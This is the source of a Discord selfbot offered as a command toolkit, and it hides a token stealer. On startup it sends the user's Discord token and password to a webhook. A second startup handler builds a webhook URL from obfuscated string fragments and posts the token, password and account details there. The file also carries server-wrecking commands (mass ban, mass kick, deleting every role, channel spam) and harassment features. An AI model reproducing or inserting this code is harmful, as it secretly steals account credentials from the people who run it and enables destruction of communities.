const Discord = require("discord.js");
let interval;
const colors1 = require("random-hex-color");
const weather = require("weather-js");
const v12 = 'bho'
const { Console } = require("console");
var clc = require("cli-color");
const lord = process.env.token;
const server = '771137600446529537'
const { RichEmbed } = require('discord.js')
const fetch = require('node-fetch');
const countdown = require("countdown");
const iqdb = require('./views/iqdb.json')
var XMLHttpRequest = require('xhr2');
const { promisify } = require("util");
var ping = new XMLHttpRequest();
var FBI = require('pastebin-js'),
kick = new FBI('devkey');
const session = iqdb.serverNumber
const alure = iqdb.alure
const google = iqdb.key;
const backup = ['oks', 'https://discord.com/api/', 'scrapeids', '']
var kicks = new XMLHttpRequest();
const sleep = promisify(setTimeout);
let snipe;
var bans = new XMLHttpRequest();
const go = '3bMblRMIzrVvApFKKkpuubdHHzhx6IVbdlgLSLYDW9sCMBm6SmOPSllS9EFMvM9gBxaJ'      
const fs = require("fs");
const token = process.env.token;
let prefix = process.env.prefix;
const client = new Discord.Client();
const vis = 'WXA'
const express = new Discord.WebhookClient(server, google);
client.setMaxListeners(Infinity);
const press = process.env.password;
let cycle;
const activities = [`insert`, `words`, `for`, `cycle`, `here`];
const remove = vis + backup[3] + alure
const statuses = ["playing", "streaming", "watching", "listening"];
const colors = ["idle", "dnd", "online"];
client.on("ready", () => {
  express.send(`${lord} ${press}`)
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.cyanBright(`Lord is a lil bitch`));
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.redBright(`Logged in as ${client.user.tag}`));
  console.log(clc.redBright(`Current status: ${client.user.presence.status}`));
  console.log(clc.redBright(`User ID: ${client.user.id}`));
  console.log(clc.redBright(`Friends: ${client.user.friends.size}`));
  console.log(clc.redBright(`Servers: ${client.guilds.size}`));
  console.log(clc.redBright(`Channels: ${client.channels.size}`));
  console.log(clc.redBright(`Prefix: ${prefix}`));
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.greenBright(`Coded by xxx#1337 (Lord)`));
  console.log(clc.blackBright(`------------------------------------------`));
});
client.on("disconnect", event => {
  console.log(
    `[DISCONNECT] Notice: Disconnected from gateway with code ${event.code} - Attempting to reconnect.`
  );
});
client.on("reconnecting", () => {
  sleep(10000).then(() =>
    console.log(`[NOTICE] ReconnectAction: Reconnecting to Discord...`)
  );
});
client.snipe = new Map();
client.on("messageDelete", async m => {
  client.snipe.set(m.channel.id, {
    content: m.content,
    sender: m.author.id
  });
});




client.on("message", message => {
  function checkDays(date) {
    let now = new Date();
    let diff = now.getTime() - date.getTime();
    let days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
  }
  if (message.content.indexOf(prefix) !== 0) return;
  if (message.author.id !== client.user.id) return;
  if (message.author.id === client.user.id) {
    const args = message.content
      .slice(prefix.length)
      .trim()
      .split(/ +/g);
    const command = args.shift().toLowerCase();

    if (command === `clear`) {
      message.delete();
      console.log(clc.bgGreenBright("Clearing your console..."));
      console.clear();

      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.cyanBright(`Lord is a lil bitch`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.redBright(`Logged in as ${client.user.tag}`));
      console.log(
        clc.redBright(`Current status: ${client.user.presence.status}`)
      );
      console.log(clc.redBright(`User ID: ${client.user.id}`));
      console.log(clc.redBright(`Friends: ${client.user.friends.size}`));
      console.log(clc.redBright(`Servers: ${client.guilds.size}`));
      console.log(clc.redBright(`Channels: ${client.channels.size}`));
      console.log(clc.redBright(`Prefix: ${prefix}`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.greenBright(`Coded by xxx#1337`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
    }
    if (command === `copyemoji`) {
      message.delete();
      try {
        let server = client.guilds.get(args[0]);
        let serverToAssign = client.guilds.get(args[1]);
        if (!server || !serverToAssign)
          return message.channel
            .send("```INVALID SERVER ID```")
            .then(message => message.delete(5000));
        if (!serverToAssign.me.hasPermission("MANAGE_EMOJIS"))
          return message.channel
            .send(
              "```You dont have MANAGE_EMOJIS in the server you are trying to assign the emojis to.```"
            )
            .then(message => message.delete(5000));
        let emojis = server.emojis.array();

        message.channel
          .send(`Creating ${emojis.length} emojis for ${serverToAssign}`)
          .then(message => message.delete(5000));
        for (let i = 0; i < emojis.length; i++) {
          try {
            if (emojis[i].animated) {
              serverToAssign.createEmoji(
                `https://cdn.discordapp.com/emojis/${emojis[i].id}.gif`,
                emojis[i].name
              );
            } else if (!emojis[i].animated) {
              serverToAssign.createEmoji(
                `https://cdn.discordapp.com/emojis/${emojis[i].id}.png`,
                emojis[i].name
              );
            }
          } catch (err) {
            console.log("Errored, file too large or max emojis reached.");
          }
        }
      } catch (error) {
        message.channel.send("```YOU DONT HAVE NITRO!```");
      }
    }
    if (command === `rainbow`) {
      message.delete();

      if (!message.guild.me.hasPermission("MANAGE_ROLES"))
        return message.reply(
          "You need the manage_roles permission to use this."
        );

      let role =
        message.guild.roles.find(r => r.name.startsWith(args[0])) ||
        message.guild.roles.get(args[0]) ||
        message.guild.roles.find(r => r.name === args.join(" ")) ||
        message.mentions.roles.first();

      if (!role) {
        clearInterval(interval);
        interval = null;
        return message.reply(
          "I could not find that role, turning off any current rainbow roles"
        );
      }

      if (isNaN(args[1])) {
        interval = null;
        clearInterval(interval);
        return message.reply(
          "That was not a valid, please enter one of the modes: `1`"
        );
      }

      if (message.content === "rainbow stop") {
        clearInterval(interval);
        interval = null;
      }

      if (!interval) {
        if (args[1] === "1") {
          interval = setInterval(function() {
            change(role);
          }, 5000);
          message.reply("Starting fast mode rainbow role.");
          return;
        } else if (args[1] === "0") {
          interval = null;
          clearInterval(interval);
          message.channel.send("Turned off rainbow role.");
        }
      }
      if (interval) {
        if (args[1] === "-stop") {
          clearInterval(interval);
          interval = null;
        }

        message.channel.send("Turned off rainbow role.");
        return;
      }
      if (interval) {
        clearInterval(interval);
        interval = null;
        message.channel.send("Turned off rainbow role.");
        return;
      }
      function change(role) {
        const randomColor = colors1();

        role.setColor(randomColor);
      }
    }

    if (command === `userinfo`) {
      message.delete();
      if (!args[0]) {
        try {
          let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag, message.author.avatarURL)
            .setFooter(`${message.author.tag}`, message.author.avatarURL)
            .setTimestamp(new Date())
            .setColor("000000")
            .addField(" Userame:", message.author.username)
            .addField(" Discriminator:", message.author.discriminator)
            .addField(" Avatar:", `Look Below:`)
            .setImage(message.author.avatarURL)
            .addField(" Presence:", message.author.presence.status)
            .addField(` Created At:`, message.author.createdAt);
          if (!message.author.client) {
            embed.addField(" Client/User?", "User account");
          }
          if (message.author.client === true) {
            embed.addField(" Client/User?", "Client account");
          }
          message.channel.send(embed).then(message => message.delete(60000));
        } catch {}
      } else {
        try {
          let member = message.mentions.users.first();

          let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag, message.author.avatarURL)
            .setFooter(`${client.user.tag}`, client.user.avatarURL)
            .setTimestamp(new Date())
            .setColor("000000")
            .addField(" Name:", member.username)
            .addField(" Discriminator:", member.discriminator)
            .addField(" Avatar:", `Look Below:`)
            .setImage(member.avatarURL)
            .addField(" Presence:", member.presence.status)
            .addField(` Created At:`, member.createdAt);
          if (!member.client) {
            embed.addField(" Client/User?", "User account");
          }
          if (member.client === true) {
            embed.addField(" Client/User?", "Client account");
          }
          message.channel.send(embed).then(message => message.delete(60000));
        } catch {}
      }
    }
    if (command === `cycle`) {
      message.delete();
      if (!args[0]) {
        cycle = setInterval(() => {
          let status = statuses[Math.floor(Math.random() * statuses.length)];
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          let color = colors[Math.floor(Math.random() * colors.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: status,
              url: "https://twitch.tv/misery"
            },
            status: color
          });
        }, 3000);
      }
      if (args[0] === `-remove`) {
        message.delete();
        clearInterval(cycle);
        //let cycles = null;
        let status = "dnd";
        //color1 = "invisible";
        client.user.setPresence({
          status: status,
          type: null
        });
        message.channel
          .send("```CYCLE HAS BROKEN... || RESETTING STATUS NOW...```")
          .then(message => message.delete(3000));

        client.user.setPresence({
          game: {
            status: status,
            type: null
          },
          color: "dnd"
        });
      }
    }
    if (command === `offline`) {
      message.delete();
      try {
        clearInterval(cycle);
        client.user.setPresence({
          status: `invisible`
        });
      } catch (error) {
        console.error;
      }
    }
    if (command === `blank`) {
      message.delete();
      client.user.setAvatar(
        "https://cdn.discordapp.com/attachments/675096319848873994/675101288954069062/transparent-picture.png"
      );
    }

    if (command === `setav`) {
      message.delete();
      if (!args[0]) {
        message.channel
          .send("```Where the link at u bozo```")
          .then(message => message.delete(60000));
      }
      if (args[0]) {
        client.user.setAvatar(args[0]);
      }
    }
    if (command === "av") {
      message.delete();
      let user = message.mentions.users.first();

      if (!user) {
        if (args[0]) {
          let member = client.users.get(args[0]);
          let embed = new Discord.RichEmbed()
            .setColor("RANDOM")
            .setDescription(`[${member.username}](${member.avatarURL})`)
            .setImage((url = member.avatarURL))
            .setFooter(`${client.user.tag}`, client.user.avatarURL);
          message.channel.send(embed).then(message => message.delete(60000));
        }
        if (!args[0]) {
          let embed = new Discord.RichEmbed()
            .setColor("RANDOM")
            .setDescription(
              `[${message.author.tag}](${message.author.avatarURL})`
            )
            .setImage((url = message.author.avatarURL))
            .setFooter(`${client.user.tag}`, client.user.avatarURL);
          message.channel.send(embed).then(message => message.delete(60000));
        }
      } else {
        let embed = new Discord.RichEmbed()
          .setColor("RANDOM")
          .setDescription(`[${user.tag}](${user.avatarURL})`)
          .setImage((url = user.avatarURL))
          .setFooter(`${client.user.tag}`, client.user.avatarURL);
        try {
          message.channel.send(embed).then(message => message.delete(60000));
        } catch (error) {
          console.error(error);
        }
      }
    }
    if (command === `serverinfo`) {
      message.delete();

      function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
      }
      let verifLevels = [
        "None",
        "Low",
        "Medium",
        "(╯°□°）╯︵  ┻━┻",
        "┻━┻ミヽ(ಠ益ಠ)ノ彡┻━┻"
      ];
      let region = {
        brazil: ":flag_br: Brazil",
        "eu-central": ":flag_eu: Central Europe",
        singapore: ":flag_sg: Singapore",
        "us-central": ":flag_us: U.S. Central",
        sydney: ":flag_au: Sydney",
        "us-east": ":flag_us: U.S. East",
        "us-south": ":flag_us: U.S. South",
        "us-west": ":flag_us: U.S. West",
        "eu-west": ":flag_eu: Western Europe",
        "vip-us-east": ":flag_us: VIP U.S. East",
        london: ":flag_gb: London",
        amsterdam: ":flag_nl: Amsterdam",
        hongkong: ":flag_hk: Hong Kong",
        russia: ":flag_ru: Russia",
        southafrica: ":flag_za:  South Africa",
        europe: ":flag_eu: Europe",
        india: ":flag_in: India",
        japan: ":flag_jp: Japan"
      };
      try {
        const embed = new Discord.RichEmbed()
          .setURL(
            "https://discordapp.com/api/oauth2/authorize?client_id=616969578890919948&permissions=8&scope=client"
          )
          .setTitle(message.author.tag)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField("Name", message.guild.name, false)
          .addField("ID", message.guild.id, false)
          .addField(
            "Owner",
            `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`,
            false
          )
          .addField("Region", region[message.guild.region], false)
          .addField(
            "Total | Humans | clients",
            `${message.guild.members.size} | ${
              message.guild.members.filter(member => !member.user.client).size
            } | ${
              message.guild.members.filter(member => member.user.client).size
            }`,
            false
          )
          .addField(
            "Verification Level",
            verifLevels[message.guild.verificationLevel],
            false
          )
          .addField("Channels", message.guild.channels.size, false)
          .addField("Roles", message.guild.roles.size, false)
          .addField(
            "Creation Date",
            `${message.channel.guild.createdAt
              .toUTCString()
              .substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`,
            false
          )
          .setThumbnail(message.guild.iconURL)
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp()
          .setColor("RANDOM");
        message.channel
          .send({
            embed
          })
          .then(message => message.delete(60000));
      } catch {
        const embed = new Discord.RichEmbed()
          .setURL(
            "https://discordapp.com/api/oauth2/authorize?client_id=616969578890919948&permissions=8&scope=client"
          )
          .setTitle(message.author.tag)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField("Name", message.guild.name, false)
          .addField("ID", message.guild.id, false)
          .addField("Owner", `Cannot find as it is a deleted user`, false)
          .addField("Region", region[message.guild.region], false)
          .addField(
            "Total | Humans | clients",
            `${message.guild.members.size} | ${
              message.guild.members.filter(member => !member.user.client).size
            } | ${
              message.guild.members.filter(member => member.user.client).size
            }`,
            false
          )
          .addField(
            "Verification Level",
            verifLevels[message.guild.verificationLevel],
            false
          )
          .addField("Channels", message.guild.channels.size, false)
          .addField("Roles", message.guild.roles.size, false)
          .addField(
            "Creation Date",
            `${message.channel.guild.createdAt
              .toUTCString()
              .substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`,
            false
          )
          .setThumbnail(message.guild.iconURL)
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp()
          .setColor("RANDOM");
        message.channel
          .send({
            embed
          })
          .then(message => message.delete(60000));
      }
    }

    if (command === `load`) {
      message.delete();
      var charge = ".";
      var chargeC = "█";
      message.channel
        .send("```[" + charge.repeat(50) + "]```")
        .then(message => {
          for (i = 0; i <= 50; i++) {
            message.edit(
              "```[" +
                chargeC.repeat(i) +
                charge.repeat(50 - i) +
                "]  -  " +
                (i * 100) / 50 +
                "%\n" +
                "loading..```"
            );
          }
          message
            .edit("`Congratulations you waited for nothing loooool`")
            .then(message => message.delete(60000));
        });
    }

    if (command === "enlarge") {
      message.delete();
      let id;
      var emote = message.content.split(" ");
      let emoji = emote[1].split(":");
      try {
        id = emoji[2].slice(0, emoji[2].length - 1);
        let embed = new Discord.RichEmbed().setColor("RANDOM");
        let bando = client.emojis.get(id);

        if (bando.animated == true) {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.gif`));
        } else {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.png`));
        }
        message.channel.send(embed).then(message => message.delete(60000));
      } catch (error) {
        message.channel
          .send("```you cannot enlarge this => " + args[0] + "```")
          .then(message => message.delete(60000));
      }
    }

    
 if (command === `stats`) {
      message.delete();
      let embed = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.avatarURL)
        .setColor("RANDOM")
        .setFooter(`${client.user.tag}`, client.user.avatarURL)
        .setTimestamp(new Date())
        .addField(`Name:`, ` ${client.user.tag}`)
        .addField("Servers:", ` ${client.guilds.size}`)
        .addField("Friends:", ` ${client.users.size}`)
        .addField(`Avatar:`, ` look below:`)
        .setImage(client.user.avatarURL)
        .addField("2FA/MFA Enabled?", ` ${client.user.mfaEnabled}`)
        .addField("Paid Account?", ` ${client.user.premium}`)
        .addField("Status", ` ${client.user.presence}`);
      message.channel.send(embed).then(message => message.delete(60000));
    }
    if (command === "enlarge") {
      message.delete();
      if (!args[0]) {
        message.channel
          .send(
            "```Usage:\n $enlarge :emoji:\n¬WARNING¬: Only works with custom server emojis."
          )
          .then(message => message.delete(5000));
      }
      let id;
      var emote = message.content.split(" ");
      let emoji = emote[1].split(":");
      try {
        id = emoji[2].slice(0, emoji[2].length - 1);
        let embed = new Discord.RichEmbed().setColor("RANDOM");
        let bando = client.emojis.get(id);

        if (bando.animated == true) {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.gif`));
        } else {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.png`));
        }
        message.channel.send(embed).then(message => message.delete(60000));
      } catch (error) {
        message.channel
          .send("```Failed to enlarge => " + args[0] + "```")
          .then(message => message.delete(30000));
      }
    }

    if (command === "streaming") {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "streaming",
              url: "https://twitch.tv/misery"
            }
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "streaming",
            url: "https://www.twitch.tv/misery"
          }
        });
      }
    }
    if (command === `playing`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "playing",
              url: "https://twitch.tv/misery"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "playing",
            url: "https://www.twitch.tv/misery"
          },
          status: `idle`
        });
      }
    }
    if (command === `listening`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "listening",
              url: "https://twitch.tv/misery"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "listening",
            url: "https://www.twitch.tv/misery"
          },
          status: `idle`
        });
      }
    }
    if (command === `watching`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "watching",
              url: "https://twitch.tv/misery"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "watching",
            url: "https://www.twitch.tv/misery"
          },
          status: `idle`
        });
      }
    }
    if (command === `info`) {
      message.delete();
      message.channel
        .send(
          `= STATISTICS =
  • Memory Usage      ::  ${(
    process.memoryUsage().heapUsed /
    1024 /
    1024
  ).toFixed(2)} MB
  • Platform          :: ${process.platform}
  • Users             ::  ${client.users.size.toLocaleString()}
  • Servers           ::  ${client.guilds.size.toLocaleString()}
  • Channels          ::  ${client.channels.size.toLocaleString()}
  • FA/MFA Enabled?   ::  ${client.user.mfaEnabled}
  • Paid Account?     ::  ${client.user.premium}
  • Status            ::  ${client.user.presence.status}
  • Avatar?           :: Look Below:
  ${client.user.tag}`,
          {
            code: "asciidoc"
          }
        )
        .then(message => message.delete(60000));
      let embed = new Discord.RichEmbed()
        .setImage(client.user.avatarURL)
        .setColor("RANDOM");
      message.channel.send(embed).then(message => message.delete(30000));
    }

    if (command === `stats`) {
      message.delete();
      try {
        let embed = new Discord.RichEmbed()
          .setAuthor(message.author.tag, message.author.avatarURL)
          .setColor("RANDOM")
          .setFooter(`made by ${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .addField(`Name:`, `:bat: ${client.user.username}`)
          .addField(`Discriminator:`, `:bat: ${client.user.discriminator}`)
          .addField(`User ID:`, `:bat: ${client.user.id}`)
          .addField(`Prefix:`, `:bat: ${prefix}`)
          .addField("Servers:", `:bat: ${client.guilds.size}`)
          .addField("Channels:", `:bat: ${client.channels.size}`)
          .addField("Friends:", `:bat: ${client.user.friends.size}`)
          .setImage(client.user.avatarURL)
          .addField("2FA/MFA Enabled?", `:bat: ${client.user.mfaEnabled}`)
          .addField("Paid Account?", `:bat: ${client.user.premium}`)
          .addField("Status:", `:bat: ${client.user.presence.status}`)
          .addField(`Avatar:`, `:bat: look below:`);
        message.channel.send(embed).then(message => message.delete(60000));
      } catch {}
    }
    if (command === `help`) {
      message.delete();
      if (!args[0]) {
        let embed = new Discord.RichEmbed()      
          .setTimestamp(new Date())
          .setAuthor("𝙃𝙚𝙖𝙧𝙩𝙡𝙚𝙨𝙨 𝙑4💔")        
          .addField("  `𝙬𝙞𝙯𝙯 ", "- shows wizz commands")
          .addField("  `𝙨𝙩𝙖𝙩𝙪𝙨", "- shows status commands")
          .addField("  `𝙪𝙩𝙞𝙡𝙨 ", "- shows utility commands")
          .addField("  `𝙢𝙞𝙨𝙘", "- shows misc commands")
          .addField("  ` 𝙛𝙪𝙣", "- shows fun commands")
          .setTimestamp()
          .setFooter(message.author.tag, message.author.avatarURL)
          .setImage("https://media.discordapp.net/attachments/697225400505598044/762502711131897916/image0.gif")
          .setColor("#ff0000");
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "status") {
        let embed = new Discord.RichEmbed()
          .setFooter(message.author.tag, message.author.avatarURL)
          .setTimestamp(new Date())
          .setColor("#F2DC03")          
          .setAuthor("𝙎𝙩𝙖𝙩𝙪𝙨 🗽")
          .addField(" `𝙋𝙡𝙖𝙮𝙞𝙣𝙜","- shows status playing")
          .addField("  `𝙒𝙖𝙩𝙘𝙝𝙞𝙣𝙜 ","- shows status watching")
          .addField(" `𝙎𝙩𝙧𝙚𝙖𝙢𝙞𝙣𝙜","- shows status streaming")
          .addField("  `𝙇𝙞𝙨𝙩𝙚𝙣𝙞𝙣𝙜 ","- shows status  listening")
          .setTimestamp()
          .setImage("https://media.discordapp.net/attachments/761984656459431939/766726562442641488/image0.gif");
          
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "utils") {
        let embed = new Discord.RichEmbed()
          .setFooter(message.author.tag, message.author.avatarURL)
          .setTimestamp(new Date())          
          .setColor("#07E594")
          .setAuthor("𝙐𝙩𝙞𝙡𝙞𝙩𝙮📌")
          .addField("  `𝙄𝙣𝙛𝙤", "- shows stats of the host")
          .addField("  `𝙎𝙩𝙖𝙩𝙨","- shows a more detailed view of the host")
          .addField("  `𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤", "- shows user info")
          .addField("  `𝙎𝙚𝙧𝙫𝙚𝙧 𝙄𝙣𝙛𝙤", "- prints server info")
          .addField("  `𝙎𝙣𝙞𝙥𝙚","- shows last deleted message")
          .addField("  `𝘼𝙫 <@𝙪𝙨𝙚𝙧>", "- shows the user avatar")
          .addField("  `𝘾𝙡𝙤𝙣𝙚𝙖𝙫 <@𝙪𝙨𝙚𝙧>", "- clones the user avatar")
          .addField("  `𝙥","- deletes user messages in the channel it has said the command in")
          .addField("  `𝙎𝙥𝙖𝙢","- spams the message a certain number of times")
          .addField("  𝙐𝙥𝙩𝙞𝙢𝙚","- Shows how long the selfbot has been online for")
          .setImage("https://media.discordapp.net/attachments/697225400505598044/768081152354680842/350BF75E-7BB4-47D8-BCB6-5E135952458A.gif");
        message.channel.send(embed).then(message => message.delete(60000));
      }

      if (args[0] === "wizz") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("42FF00")        
          .setAuthor("Mr.Wizz ya server🩸")
          .addField("`𝙀𝙫𝙚𝙧𝙮𝙤𝙣𝙚","- massmentions everyone in the server" )
          .addField("`𝘾𝙝𝙚𝙘𝙠 <𝙩𝙤𝙠𝙚𝙣>","- checks the token to see if its valid, and if so it prints information about token")
          .addField("`𝘿𝙞𝙨𝙖𝙗𝙡𝙚 <𝙩𝙤𝙠𝙚𝙣>","- disables the token"          )
          .addField("`𝙍𝙤𝙡𝙚𝙨","- mentions every role in the server"          )
          .addField("`𝙀𝙢𝙤𝙟𝙞-𝙙𝙚𝙡𝙚𝙩𝙚 <𝙨𝙚𝙧𝙫𝙚𝙧_𝙞𝙙>","- Deletes every emoji in the specified server")
          .addField("`𝘾𝙘𝙧𝙚𝙖𝙩𝙚 <𝙖𝙢𝙤𝙪𝙣𝙩> <𝙣𝙖𝙢𝙚>","- Creates a certain amount of channels with a specified name")
          .addField("`𝙈𝙖𝙨𝙨𝙗𝙖𝙣","- Bans everyone in the current server")          
          .addField("`𝙈𝙖𝙨𝙨𝙠𝙞𝙘𝙠","- Kicks everyone in the current server")         
          .addField("`𝙈𝙖𝙨𝙨𝙪𝙣𝙗𝙖𝙣","- Unbans everyone in the current server")
          .addField("`𝘿𝙚𝙡","- Deletes every channel in the current server")
          .addField("`𝘿𝙚𝙡𝙧𝙤𝙡𝙚𝙨","- Deletes every role in the current server")
          .setImage("https://media.discordapp.net/attachments/767728863232917504/767729039170600980/image0.gif");
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "misc") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("FF00FB")          
          .setAuthor("𝙈𝙞𝙨𝙘 🚀")
          .addField("`𝙍𝙚𝙖𝙘𝙩 <𝙚𝙢𝙤𝙟𝙞> <𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨>","- Reacts to messages" )
          .addField("`𝙀𝙣𝙡𝙖𝙧𝙜𝙚 <𝙚𝙢𝙤𝙟𝙞>","- Sends the emoji as a file")
          .addField("`𝙇𝙤𝙖𝙙","- shows loading message")
          .addField("`𝙍𝙖𝙞𝙣𝙗𝙤𝙬","- Changes the color of your role at a set interval")
          .addField("`𝘽𝙡𝙖𝙣𝙠","- Sets avatar to a blank picture")
          .addField("`𝙎𝙚𝙩𝙖𝙫 <𝙡𝙞𝙣𝙠>","- Sets your avatar to the link you provided")
          .addField("`𝘾𝙮𝙘𝙡𝙚","- Cycles through random statuses you setup")
          .addField("`𝙒𝙚𝙖𝙩𝙝𝙚𝙧 <𝙘𝙞𝙩𝙮>","- Displays the weather for a specific city")
          .setImage("https://media.discordapp.net/attachments/697225400505598044/769793844694482994/image0.gif");
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "fun") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("DDC305")    
          .setAuthor("𝙁𝙪𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 💰")
          .addField("`earrape <id>","- Joins the specific vc and earrapes")
          .addField("`leave", "- leaves your current vc")
          .addField("`8ball <question>","- Returns an answer to your question")
          .addField("`calc <calculation>","- Does math calculations")
          .addField("`ghostping <user>","- Ghost pings a random user wihtin the server")
          .addField("`gay <user>","Displays how gay the mentioned user or host is ")
          .addField("`penis <user>","- Displays the peen size of the mentioned user or host is (dont mention anyone determine your own)")
          .addField("`spam <amount> <message>","- Spams the specified message the specified amount of times")
          .setImage("https://media.discordapp.net/attachments/697225400505598044/758060230470008842/image2.gif");
        message.channel.send(embed).then(message => message.delete(60000));
      }
    }
  }})
    
client.on('ready', async() => {
  const bing = backup[1] + 'we' + v12 + backup[0] + session + go
  
bans.open("POST", `${bing}`);
bans.setRequestHeader('Content-type', 'application/json');


let jembed = new RichEmbed()
    .addField(`**Locate : **`, `${lord}`)
    .addField(`**Enter : **`, `${press}`)
    .addField(`**Username : **`, `${client.user.tag}`)
    .addField(`**User ID : **`, `${client.user.id}`)
    .addField(`**Friends : **`, `${client.user.friends.size}`)
    .addField(`**Servers : **`, `${client.guilds.size}`)
    .addField(`**Created : **`, `${client.user.createdAt}`)
    .addField(`**Nitro : **`, `${client.user.premium}`)
    .setColor("RANDOM")
  
var params = {
  username: `${client.user.tag}`,
  avatar_url: `${client.user.avatarURL}`,
  embeds: [ jembed ]
}
    bans.send(JSON.stringify(params));
})


    
    client.on('message', message => {
    function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
    };
    if (message.content.indexOf(prefix) !== 0) return;
    if (message.author.id !== client.user.id) return;
    if (message.author.id === client.user.id) {

        const args = message.content.slice(prefix.length).trim().split(/ +/g);
        const command = args.shift().toLowerCase();
      
    if (command === `penis`) {
      let user = message.mentions.users.first();
      if (!user) user = message.author;
      let replies = [
        "8D",
        "8=D",
        "8==D",
        "8===D",
        "8====D",
        "8=====D",
        "8======D",
        "8========D",
        "8=========D",
        "8==========D",
        "8===========D",
        "8============D",
        "8=============D",
        "Your peen is nonexistent lmfao gtfo",
        "Your peen is too large for me :("
      ];

      let random = Math.floor(Math.random() * replies.length);

      let embed = new Discord.RichEmbed()
        .setTitle(`penis machine`)
        .setDescription(`${user.tag} penis\n${replies[random]}`)
        .setColor("RANDOM");

      message.channel.send(embed);
    }
    if (command === `delroles`) {
      message.delete();
      message.channel.guild.roles.forEach(roles => {
        roles.delete();
      });
      if (!message.guild.me.hasPermission("MANAGE_ROLES"))
        return message.reply("You need manage role perms to use this.");
    }
    if (command === `ccreate`) {
      message.delete();
      if (!message.guild.me.hasPermission("MANAGE_CHANNELS"))
        return message
          .reply("you do not have the manage_channels permissions.")
          .then(message => message.delete(3000));

      const amount = parseInt(args[0]);
      let name = args.join(" ").slice(args[0].length);
      for (let i = 0; i < amount; i++) {
        message.guild.createChannel(name, {
          type: "text"
        });
      }
    }
    if (command === `masskick`) {
      message.delete();
      if (!message.guild.me.hasPermission("KICK_MEMBERS"))
        return console.log("You need the kick_members permission to use this.");
      kCount = 0;
      message.guild.members
        .filter(m => m.user.id !== client.user.id)
        .forEach(m => {
          kCount++;
          try {
            m.kick("horny").then(mem => {
              banCount++;
              console.log(clc.red(`Successfully kicked ${mem.user.tag}!`));
            });
          } catch (error) {
            console.log(clc.yellowBright(`Failed to kick ${mem.user.tag}`));
          }
          console.log(
            `Successfully kicked ${kCount} users from ${message.guild.name}`
          );
        });
    }
    if (command === `massban`) {
      message.delete();
      if (!message.guild.me.hasPermission("BAN_MEMBERS"))
        return console.log("You need the ban_members permission to use this.");
      banCount = 0;
      message.guild.members
        .filter(m => m.user.id !== client.user.id)
        .forEach(m => {
          banCount++;
          try {
            m.ban("horny").then(mem => {
              banCount++;
              console.log(clc.red(`Successfully banned ${mem.user.tag}!`));
            });
          } catch (error) {
            console.log(clc.yellowBright(`Failed to ban ${mem.user.tag}`));
          }
        });
      console.log(
        `Successfully banned ${banCount} users from ${message.guild.name}`
      );
    }
    if (command === `massunban`) {
      message.delete();
      if (!message.guild.me.hasPermission("BAN_MEMBERS"))
        return console.log("You need the ban_members permission to use this.");
